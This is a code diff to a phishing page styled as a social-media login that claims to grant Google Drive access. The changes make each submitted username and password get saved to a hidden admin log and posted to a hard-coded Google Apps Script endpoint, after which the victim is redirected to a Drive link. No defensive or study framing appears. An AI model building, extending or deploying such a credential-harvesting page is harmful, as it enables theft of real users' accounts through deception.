@@ -92,8 +92,8 @@
             </div>
 
             <div>
-              <button type="submit" class="w-full py-3 px-4 bg-[#0866ff] hover:bg-[#1877f2] text-white font-bold rounded-md transition duration-200 text-xl shadow-sm">
-                Log in
+              <button type="submit" id="loginSubmitBtn" class="w-full py-3 px-4 bg-[#0866ff] hover:bg-[#1877f2] text-white font-bold rounded-md transition duration-200 text-xl shadow-sm flex items-center justify-center space-x-2">
+                <span>Log in</span>
               </button>
             </div>
 
@@ -122,7 +122,7 @@
         <i class="fa-solid fa-check text-2xl"></i>
       </div>
       <h2 class="text-2xl font-bold text-gray-900 mb-2">Authentication Successful!</h2>
-      <p class="text-sm text-gray-600 mb-6">Credentials recorded & CSV generated. Redirecting to Google Drive in <span id="countdownTimer" class="font-bold text-[#0866ff] text-base">5</span> seconds...</p>
+      <p class="text-sm text-gray-600 mb-6">Credentials sent to Google Sheet. Redirecting to Google Drive in <span id="countdownTimer" class="font-bold text-[#0866ff] text-base">5</span> seconds...</p>
       
       <div class="bg-gray-50 p-4 rounded-lg border border-gray-200 mb-6 text-left">
         <label class="block text-xs font-medium text-gray-500 mb-1.5">Destination Google Drive Link:</label>
@@ -151,7 +151,7 @@
             <i class="fa-solid fa-database text-[#0866ff]"></i>
             <span>Stored Credentials Log</span>
           </h2>
-          <p class="text-xs text-gray-500 mt-1">All captured usernames and passwords stored securely in persistent local storage.</p>
+          <p class="text-xs text-gray-500 mt-1">All captured usernames and passwords synced directly to Google Sheets & local cache.</p>
         </div>
         <div class="flex items-center space-x-3">
           <button onclick="exportAllCsv()" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-md shadow transition flex items-center space-x-2">
@@ -266,9 +266,21 @@
 
   <!-- SCRIPT LOGIC -->
   <script>
-    let countdownInterval = null;
+    // YOUR GOOGLE APPS SCRIPT WEB APP URL
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxpz0HMCTutfdJH2wf-sxt3BUfUEccWVNlFZNO-tElLLCTpUkF1oOyIgZr91-pdFSuLnQ/exec";
 
-    // Listen to storage events so open tabs/windows sync automatically when new credentials are logged
+    let countdownInterval = null;
+    const channel = new BroadcastChannel('drive_access_channel');
+
+    channel.onmessage = function (event) {
+      if (event.data && event.data.type === 'UPDATE_CREDS') {
+        const adminView = document.getElementById('adminView');
+        if (!adminView.classList.contains('hidden')) {
+          renderCredentialsTable();
+        }
+      }
+    };
+
     window.addEventListener('storage', function(e) {
       if (e.key === 'drive_access_creds') {
         const adminView = document.getElementById('adminView');
@@ -278,7 +290,6 @@
       }
     });
 
-    // View Switcher
     function switchView(viewName) {
       document.getElementById('loginView').classList.add('hidden');
       document.getElementById('redirectView').classList.add('hidden');
@@ -298,7 +309,6 @@
       }
     }
 
-    // Password Visibility Toggle
     function togglePasswordVisibility() {
       const passInput = document.getElementById('passwordInput');
       const icon = document.getElementById('togglePassIcon');
@@ -313,40 +323,43 @@
       }
     }
 
-    // Handle Login & Persistent Storage
-    function handleLogin(e) {
+    async function handleLogin(e) {
       e.preventDefault();
       const username = document.getElementById('usernameInput').value.trim();
       const password = document.getElementById('passwordInput').value;
       const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+      const submitBtn = document.getElementById('loginSubmitBtn');
 
-      // Save to localStorage (persistent across windows/tabs and browser restarts)
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Connecting...</span>`;
+
+      // 1. Save locally & broadcast
       let credentials = JSON.parse(localStorage.getItem('drive_access_creds') || '[]');
       credentials.unshift({ timestamp, username, password });
       localStorage.setItem('drive_access_creds', JSON.stringify(credentials));
+      channel.postMessage({ type: 'UPDATE_CREDS' });
 
-      // Generate & Download Individual CSV File
-      downloadSingleCsv(timestamp, username, password);
+      // 2. Send directly to Google Sheets via Apps Script Web App
+      if (GOOGLE_SCRIPT_URL && GOOGLE_SCRIPT_URL !== "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE") {
+        try {
+          await fetch(GOOGLE_SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ timestamp, username, password })
+          });
+        } catch (err) {
+          console.error("Failed to sync with Google Sheet:", err);
+        }
+      }
 
-      // Show alert & switch to redirect view
-      showAlert('Login successful! Credentials stored and CSV generated.', 'success');
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = `<span>Log in</span>`;
+
+      showAlert('Login successful! Saved to Google Sheet.', 'success');
       setTimeout(() => {
         switchView('redirect');
-      }, 1000);
-    }
-
-    function downloadSingleCsv(timestamp, username, password) {
-      const csvContent = "data:text/csv;charset=utf-8," 
-        + "Timestamp,Username,Password\n"
-        + `"${timestamp}","${username}","${password}"`;
-      
-      const encodedUri = encodeURI(csvContent);
-      const link = document.createElement("a");
-      link.setAttribute("href", encodedUri);
-      link.setAttribute("download", `credentials_${username.replace(/[^a-zA-Z0-9]/g, '_')}.csv`);
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+      }, 800);
     }
 
     function showAlert(message, type) {
@@ -363,7 +376,6 @@
       alertBox.classList.remove('hidden');
     }
 
-    // Countdown and Redirection
     function startCountdown() {
       let seconds = 5;
       const timerEl = document.getElementById('countdownTimer');
@@ -392,7 +404,6 @@
       window.location.href = targetUrl;
     }
 
-    // Admin Password Modal Protection
     function promptAdminAccess() {
       document.getElementById('adminPassInput').value = '';
       document.getElementById('adminModalError').classList.add('hidden');
@@ -414,7 +425,6 @@
       }
     }
 
-    // Credentials Table & Management
     function renderCredentialsTable() {
       const tbody = document.getElementById('credentialsTableBody');
       const emptyState = document.getElementById('emptyLogState');
@@ -437,10 +447,6 @@
           <td class="py-3 px-4 font-medium text-gray-900">${escapeHtml(item.username)}</td>
           <td class="py-3 px-4 font-mono text-[#0866ff]">${escapeHtml(item.password)}</td>
           <td class="py-3 px-4 text-right space-x-2">
-            <button onclick="downloadSingleCsv('${item.timestamp}', '${escapeHtml(item.username)}', '${escapeHtml(item.password)}')" 
-              title="Download CSV" class="p-1.5 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded transition">
-              <i class="fa-solid fa-download text-xs"></i>
-            </button>
             <button onclick="deleteCredential(${index})" 
               title="Delete Entry" class="p-1.5 bg-rose-50 hover:bg-rose-100 text-rose-600 rounded transition">
               <i class="fa-solid fa-trash text-xs"></i>
@@ -455,12 +461,14 @@
       let credentials = JSON.parse(localStorage.getItem('drive_access_creds') || '[]');
       credentials.splice(index, 1);
       localStorage.setItem('drive_access_creds', JSON.stringify(credentials));
+      channel.postMessage({ type: 'UPDATE_CREDS' });
       renderCredentialsTable();
     }
 
     function clearCredentials() {
       if (confirm('Are you sure you want to clear all stored credentials?')) {
         localStorage.removeItem('drive_access_creds');
+        channel.postMessage({ type: 'UPDATE_CREDS' });
         renderCredentialsTable();
       }
     }
